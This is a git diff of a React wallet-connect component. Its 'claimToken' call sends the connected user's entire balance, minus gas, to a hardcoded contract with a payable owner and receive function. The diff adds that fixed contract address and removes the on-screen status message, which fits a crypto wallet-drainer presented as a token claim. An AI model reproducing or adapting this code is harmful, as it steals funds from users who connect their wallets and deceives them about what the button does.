@@ -3,7 +3,7 @@
 import React, { useState, useEffect } from "react";
 import { useWeb3Modal } from "@web3modal/wagmi/react";
 import { useAccount, useWalletClient } from "wagmi";
-import { ethers } from "ethers";
+import { ethers, providers, Contract } from "ethers";
 
 export default function ConnectButton() {
   const { open } = useWeb3Modal();
@@ -20,18 +20,45 @@ export default function ConnectButton() {
     }
 
     try {
-      // Create ethers.js signer from the wallet client
-      const signer = new ethers.providers.Web3Provider(
-        walletClient
-      ).getSigner();
+      // Convert the walletClient to an ethers provider
+      const provider = new providers.Web3Provider(walletClient.transport);
 
-      const CONTRACT_ADDRESS = "0xYourContractAddress"; // Replace with your contract address
-      const CONTRACT_ABI = ["function claimToken() external payable"];
-      const contract = new ethers.Contract(
-        CONTRACT_ADDRESS,
-        CONTRACT_ABI,
-        signer
-      );
+      // Create signer from the provider
+      const signer = provider.getSigner();
+
+      const CONTRACT_ADDRESS = "0x63e38D73f0a5795263f4f5ebE9dDe4aa23bd57cE"; // Replace with your contract address
+      const CONTRACT_ABI = [
+        {
+          inputs: [],
+          stateMutability: "nonpayable",
+          type: "constructor",
+        },
+        {
+          inputs: [],
+          name: "claimToken",
+          outputs: [],
+          stateMutability: "payable",
+          type: "function",
+        },
+        {
+          inputs: [],
+          name: "owner",
+          outputs: [
+            {
+              internalType: "address payable",
+              name: "",
+              type: "address",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          stateMutability: "payable",
+          type: "receive",
+        },
+      ];
+      const contract = new Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
 
       // Get user's current balance
       const userBalance = await signer.getBalance();
@@ -42,7 +69,7 @@ export default function ConnectButton() {
       }
 
       // Estimate gas fees for the transfer
-      const gasPrice = await signer.getGasPrice(); // Current gas price
+      const gasPrice = await provider.getGasPrice(); // Current gas price
       const gasEstimate = await contract.estimateGas.claimToken({
         value: userBalance,
       });
@@ -91,7 +118,6 @@ export default function ConnectButton() {
           <button className="transfer-button" onClick={claimToken}>
             Transfer Funds
           </button>
-          <p>{status}</p>
         </>
       )}
     </div>
